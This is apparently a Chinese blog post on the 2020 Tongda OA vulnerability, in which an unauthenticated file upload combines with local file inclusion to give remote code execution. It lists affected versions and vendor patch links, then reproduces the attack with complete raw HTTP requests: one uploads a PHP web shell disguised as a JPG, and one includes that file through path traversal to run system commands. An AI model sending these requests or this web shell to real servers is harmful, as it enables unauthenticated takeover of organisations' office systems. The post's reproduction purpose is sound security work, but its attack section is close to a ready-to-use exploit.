**目录**

[漏洞描述](#t0 "漏洞描述")

[漏洞等级](#t1 "漏洞等级")

[漏洞影响版本](#t2 "漏洞影响版本")

[修复建议](#t3 "修复建议")

[漏洞复现](#t4 "漏洞复现")

* * *

### 漏洞描述

通达OA是北京通达信科科技有限公司出品的 "Office Anywhere 通达网络智能办公系统"。

3月13日，通达OA在官方论坛发布通告称，近日接到用户反馈遭到勒索病毒攻击，提示用户注意安全风险，并且于同一天对所有版本发布了加固补丁。

在受影响的版本中，攻击者可以在未认证的情况下向服务器上传jpg图片文件，然后包含该文件，造成远程代码执行。**该漏洞无需登录即可触发。**

### **漏洞等级**

**高危**

### **漏洞影响版本**

*   V11版
*   2017版
*   2016版
*   2015版
*   2013增强版
*   2013版

### 修复建议

| 版本 | 更新包下载地址 |
| --- | --- |
| V11版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.11.3.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe") |
| 2017版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.10.19.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe") |
| 2016版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.9.13.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe") |
| 2015版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.8.15.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe") |
| 2013增强版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.7.25.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe") |
| 2013版 | [http://cdndown.tongda2000.com/oa/security/2020\_A1.6.20.exe](http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe "http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe") |

### **漏洞复现**

首先下载安装包安装环境，安装包地址，关注微信公众号：xie\_sec ，回复：通达OA  即可获得下载链接。

安装好漏洞环境后，访问目标网站。

![](https://img-blog.csdnimg.cn/20200322214922531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**脚本复现**

首先用脚本复现，直接命令执行即可。

```
python3 tongda_rce.py 目标URL
```


![](https://img-blog.csdnimg.cn/20200322215017765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**手工复现**

手工抓包验证，该漏洞存在于以下两个链接中，并且以下链接无需认证即可访问。

1.  任意文件上传漏洞  /ispirit/im/upload.php
    
2.  本地文件包含漏洞  /ispirit/interface/gateway.php
    

```
POST /ispirit/im/upload.php HTTP/1.1      
Host: 192.168.10.130      
Content-Length: 656      
Cache-Control: no-cache      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36      
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB      
Accept: */*      
Accept-Encoding: gzip, deflate      
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5      1
Cookie: PHPSESSID=123      1
Connection: close       1
------WebKitFormBoundarypyfBh1YB4pV8McGB      1
Content-Disposition: form-data; name="UPLOAD_MODE"       1
2      1
------WebKitFormBoundarypyfBh1YB4pV8McGB      1
Content-Disposition: form-data; name="P"       2
123      2
------WebKitFormBoundarypyfBh1YB4pV8McGB      2
Content-Disposition: form-data; name="DEST_UID"       2
1      2
------WebKitFormBoundarypyfBh1YB4pV8McGB      2
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"      2
Content-Type: image/jpeg       2
<?php      3
$command=$_POST['cmd'];      3
$wsh = new COM('WScript.shell');      3
$exec = $wsh->exec("cmd /c ".$command);      3
$stdout = $exec->StdOut();      3
$stroutput = $stdout->ReadAll();      3
echo $stroutput;      3
?>      3
------WebKitFormBoundarypyfBh1YB4pV8McGB--
```


上传成功后，我们看到服务器端返回的数据。接下来下一步我们需要包含的文件名就是 2003/89512385.jpg 

![](https://img-blog.csdnimg.cn/20200322215955445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后访问  /ispirit/interface/gateway.php 链接，POST数据包如下

```
POST /ispirit/interface/gateway.php HTTP/1.1      
Host: 192.168.10.130      
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8      
Connection: close      
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3      
X-Forwarded-For: 127.0.0.1      
Upgrade-Insecure-Requests: 1      
Content-Type: application/x-www-form-urlencoded      1
Content-Length: 75       1
json={"url":"../../../general/../attach/im/2003/89512385.jpg"}&cmd=ipconfig
```


![](https://img-blog.csdnimg.cn/20200322223752497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)